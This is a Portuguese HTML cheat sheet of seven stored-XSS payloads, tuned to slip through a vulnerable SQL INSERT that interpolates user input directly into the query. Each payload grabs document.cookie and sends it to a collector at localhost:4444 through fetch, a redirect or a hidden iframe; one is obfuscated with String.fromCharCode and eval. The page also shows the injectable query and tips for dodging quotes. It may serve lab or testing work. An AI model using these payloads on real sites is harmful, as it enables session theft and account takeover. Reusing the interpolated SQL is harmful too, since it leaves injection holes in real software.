<!DOCTYPE html>
<html>
<head>
    <title>XSS Stored - Payloads que passam pela query SQL</title>
</head>
<body>

<h2>Payloads XSS Stored que funcionam com a query SQL vulner√°vel</h2>

<p><strong>Problema:</strong> A query SQL √©: <code>INSERT INTO messages (user_id, title, content) VALUES (${userId}, '${title}', '${content}')</code></p>
<p><strong>Solu√ß√£o:</strong> Escapar aspas simples ou usar payloads sem aspas simples</p>

<hr>

<h3>‚úÖ Op√ß√£o 1: SVG com aspas duplas (Mais limpo)</h3>
<p><strong>T√≠tulo:</strong> Teste XSS</p>
<p><strong>Conte√∫do:</strong></p>
<textarea rows="2" cols="100">
&lt;svg onload="fetch(&quot;http://localhost:4444/debug-cookie?cookie=&quot;+encodeURIComponent(document.cookie))"&gt;&lt;/svg&gt;
</textarea>

<h3>‚úÖ Op√ß√£o 2: IMG com base64 usando aspas duplas</h3>
<p><strong>T√≠tulo:</strong> Teste IMG</p>
<p><strong>Conte√∫do:</strong></p>
<textarea rows="3" cols="100">
&lt;img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 
onload="fetch(&quot;http://localhost:4444/debug-cookie?cookie=&quot;+encodeURIComponent(document.cookie))"&gt;
</textarea>

<h3>‚úÖ Op√ß√£o 3: Script usando template literals</h3>
<p><strong>T√≠tulo:</strong> Script Test</p>
<p><strong>Conte√∫do:</strong></p>
<textarea rows="3" cols="100">
&lt;script&gt;
fetch(`http://localhost:4444/debug-cookie?cookie=${encodeURIComponent(document.cookie)}`);
&lt;/script&gt;
</textarea>

<h3>‚úÖ Op√ß√£o 4: IMG com String.fromCharCode (sem aspas)</h3>
<p><strong>T√≠tulo:</strong> Encoded XSS</p>
<p><strong>Conte√∫do:</strong></p>
<textarea rows="3" cols="100">
&lt;img src=x onload="eval(String.fromCharCode(102,101,116,99,104,40,34,104,116,116,112,58,47,47,108,111,99,97,108,104,111,115,116,58,52,52,52,52,47,100,101,98,117,103,45,99,111,111,107,105,101,63,99,111,111,107,105,101,61,34,43,101,110,99,111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,41))"&gt;
</textarea>

<h3>‚úÖ Op√ß√£o 5: SVG simples e funcional</h3>
<p><strong>T√≠tulo:</strong> Simple XSS</p>
<p><strong>Conte√∫do:</strong></p>
<textarea rows="1" cols="100">
&lt;svg onload=fetch(`//localhost:4444/debug-cookie?cookie=${document.cookie}`)&gt;&lt;/svg&gt;
</textarea>

<h3>‚úÖ Op√ß√£o 6: IMG com concatena√ß√£o</h3>
<p><strong>T√≠tulo:</strong> Concat XSS</p>
<p><strong>Conte√∫do:</strong></p>
<textarea rows="2" cols="100">
&lt;img src=x onload="window.location=&quot;http://localhost:4444/debug-cookie?cookie=&quot;+document.cookie"&gt;
</textarea>

<h3>‚úÖ Op√ß√£o 7: IFRAME onload</h3>
<p><strong>T√≠tulo:</strong> IFRAME XSS</p>
<p><strong>Conte√∫do:</strong></p>
<textarea rows="2" cols="100">
&lt;iframe src=about:blank onload="fetch(&quot;http://localhost:4444/debug-cookie?cookie=&quot;+encodeURIComponent(document.cookie))" style=display:none&gt;&lt;/iframe&gt;
</textarea>

<hr>

<h3>üîß Estrat√©gias usadas:</h3>
<ul>
    <li><strong>Aspas duplas:</strong> Usar " ao inv√©s de ' no JavaScript</li>
    <li><strong>Template literals:</strong> Usar backticks ` ao inv√©s de aspas</li>
    <li><strong>Entities HTML:</strong> &quot; ao inv√©s de "</li>
    <li><strong>Encoding:</strong> String.fromCharCode para evitar caracteres especiais</li>
    <li><strong>Concatena√ß√£o:</strong> + para juntar strings sem aspas problem√°ticas</li>
</ul>

<h3>‚ö†Ô∏è Explica√ß√£o do problema:</h3>
<p>A query SQL quebra com aspas simples porque fica assim:</p>
<code>INSERT INTO messages VALUES (1, 'titulo', '&lt;svg onload='fetch...'&gt;')</code>
<p>A aspa simples dentro do payload quebra a string SQL.</p>

<h3>‚úÖ Solu√ß√£o:</h3>
<p>Usar apenas aspas duplas ou template literals no JavaScript dentro do payload.</p>

</body>
</html>